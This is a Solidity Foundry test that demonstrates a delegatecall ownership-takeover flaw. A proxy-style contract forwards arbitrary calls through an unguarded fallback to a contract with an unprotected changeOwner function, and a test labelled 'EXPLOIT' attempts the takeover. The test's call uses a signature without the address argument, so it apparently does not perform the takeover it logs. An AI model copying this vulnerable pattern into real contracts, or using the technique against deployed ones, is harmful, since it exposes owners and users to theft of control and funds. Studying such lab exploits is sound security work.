// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "lib/forge-std/src/Test.sol";

contract RestrictedOwner {
    address public owner;
    address public manager;
    address unrestrictedOwnerAddress;

    constructor(address _unrestrictedOwnerAddress) {
        unrestrictedOwnerAddress = _unrestrictedOwnerAddress;
        owner = msg.sender;
        manager = msg.sender;
    }

    function updateSettings(address _newOwner, address _newManager) public {
        require(msg.sender == owner, "Not owner!");
        owner = _newOwner;
        manager = _newManager;
    }

    fallback() external {
        (bool result, ) = unrestrictedOwnerAddress.delegatecall(msg.data);
        if (!result) {
            revert("failed");
        }
    }
}

contract UnrestrictedOwner {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        owner = _owner;
    }
}

contract TestDelegateX is Test {
    RestrictedOwner restrictedOwner;
    UnrestrictedOwner unrestrictedOwner;
    address juan;

    function setUp() public {
        juan = vm.addr(1);
    }

    function testRestrictedOwner() public {
        unrestrictedOwner = new UnrestrictedOwner();
        restrictedOwner = new RestrictedOwner(address(unrestrictedOwner));

        console.log("Address juan", address(juan));
        console.log("Address RestrictedOwner",address(restrictedOwner));
        console.log("Address UnrestrictedOwner",address(unrestrictedOwner));
        console.log("==================================================");
        console.log("");
        console.log("owner before EXPLOIT", restrictedOwner.owner());
        console.log("manager", restrictedOwner.manager());
        console.log("");
        //console.log("address unrestrictedOwnerAddress", restrictedOwner.unrestrictedOwnerAddress());
        console.log("==========EXPLOIT==========");

        vm.prank(juan);   
        address(restrictedOwner).call(abi.encodeWithSignature("changeOwner()"));
        console.log("owner after EXPLOIT (juan)", restrictedOwner.owner());

   
    }


}